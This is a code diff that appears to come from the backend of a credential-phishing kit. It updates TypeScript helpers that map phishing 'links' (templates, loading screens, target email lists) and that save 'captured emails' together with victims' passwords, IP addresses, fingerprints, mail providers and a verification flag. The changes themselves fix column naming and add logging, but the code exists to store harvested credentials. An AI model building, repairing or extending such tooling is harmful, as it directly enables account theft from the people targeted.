@@ -81,15 +81,38 @@ function stringifyJSON(value: any): string | null {
 }
 
 // Helper to map DB row to Link object
+// Handles both snake_case (schema) and camelCase (legacy) column names
 function mapRowToLink(row: any): Link {
-  return {
-    ...row,
+  // Map snake_case to camelCase for TypeScript interface
+  const link: any = {
+    id: row.id,
+    type: row.type,
+    sessionIdentifier: row.session_identifier || row.sessionIdentifier,
+    linkToken: row.link_token || row.linkToken || row.session_identifier || row.sessionIdentifier,
+    name: row.name,
+    createdAt: row.created_at || row.createdAt,
+    expiresAt: row.expires_at || row.expiresAt,
+    status: row.status,
+    templateId: row.template_id || row.templateId,
+    templateMode: row.template_mode || row.templateMode,
+    language: row.language,
+    loadingScreen: row.loading_screen || row.loadingScreen,
+    loadingDuration: row.loading_duration || row.loadingDuration,
+    email: row.email,
     used: Boolean(row.used),
-    allowedEmails: parseJSON(row.allowedEmails),
-    validatedAccounts: parseJSON(row.validatedAccounts),
-    capturedEmails: parseJSON(row.validatedAccounts), // Alias
-    pendingEmails: parseJSON(row.pendingEmails),
+    usedAt: row.used_at || row.usedAt,
+    fingerprint: row.fingerprint,
+    ip: row.ip,
+    allowedEmails: parseJSON(row.allowed_emails || row.allowedEmails),
+    validatedAccounts: parseJSON(row.validated_accounts || row.validatedAccounts),
+    capturedEmails: parseJSON(row.validated_accounts || row.validatedAccounts), // Alias
+    pendingEmails: parseJSON(row.pending_emails || row.pendingEmails),
+    totalEmails: row.total_emails || row.totalEmails,
+    capturedCount: row.captured_count || row.capturedCount,
+    pendingCount: row.pending_count || row.pendingCount,
   }
+  
+  return link as Link
 }
 
 // Helper to map DB row to CapturedEmail object
@@ -149,9 +172,28 @@ export async function saveLink(link: Link): Promise<void> {
  */
 export async function getLink(sessionIdentifier: string): Promise<Link | null> {
   const db = getDb()
-  const row = db.prepare('SELECT * FROM links WHERE sessionIdentifier = ? OR linkToken = ?').get(sessionIdentifier, sessionIdentifier)
+  
+  // Try both snake_case (schema) and camelCase (legacy) column names
+  // SQLite column names are case-insensitive, but we need to match the actual schema
+  let row = db.prepare('SELECT * FROM links WHERE session_identifier = ? OR link_token = ?').get(sessionIdentifier, sessionIdentifier)
+  
+  // If not found with snake_case, try camelCase (for legacy databases)
+  if (!row) {
+    row = db.prepare('SELECT * FROM links WHERE sessionIdentifier = ? OR linkToken = ?').get(sessionIdentifier, sessionIdentifier)
+  }
 
-  if (!row) return null
+  if (!row) {
+    console.log('[LINK DATABASE] ⚠️ Token not found:', sessionIdentifier.substring(0, 20) + '...')
+    return null
+  }
+  
+  console.log('[LINK DATABASE] ✅ Token found:', {
+    id: row.id,
+    status: row.status || row.status,
+    expires_at: row.expires_at || row.expiresAt,
+    session_identifier: row.session_identifier || row.sessionIdentifier,
+  })
+  
   return mapRowToLink(row)
 }
 
@@ -233,20 +275,34 @@ export async function getLinksByType(type: 'personalized' | 'generic'): Promise<
  */
 export async function saveCapturedEmail(captured: CapturedEmail): Promise<void> {
   const db = getDb()
+
+  // Handle hybrid schema (write to both snake_case and camelCase columns to satisfy constraints)
   const stmt = db.prepare(`
     INSERT OR REPLACE INTO captured_emails (
       id, email, sessionIdentifier, linkToken, linkType, linkName,
-      fingerprint, ip, passwords, verified, provider, capturedAt, attempts, mxRecord
+      fingerprint, ip, passwords, verified, provider, 
+      capturedAt, captured_at, 
+      attempts, 
+      mxRecord, mx_record,
+      link_id
     ) VALUES (
       ?, ?, ?, ?, ?, ?,
-      ?, ?, ?, ?, ?, ?, ?, ?
+      ?, ?, ?, ?, ?, 
+      ?, ?, 
+      ?, 
+      ?, ?,
+      ?
     )
   `)
 
   stmt.run(
     captured.id, captured.email, captured.sessionIdentifier, captured.linkToken, captured.linkType, captured.linkName,
     captured.fingerprint, captured.ip, stringifyJSON(captured.passwords), captured.verified ? 1 : 0,
-    captured.provider, captured.capturedAt, captured.attempts, captured.mxRecord
+    captured.provider,
+    captured.capturedAt, captured.capturedAt, // Write to both
+    captured.attempts,
+    captured.mxRecord, captured.mxRecord, // Write to both
+    captured.sessionIdentifier // Write to link_id as well
   )
 }
 
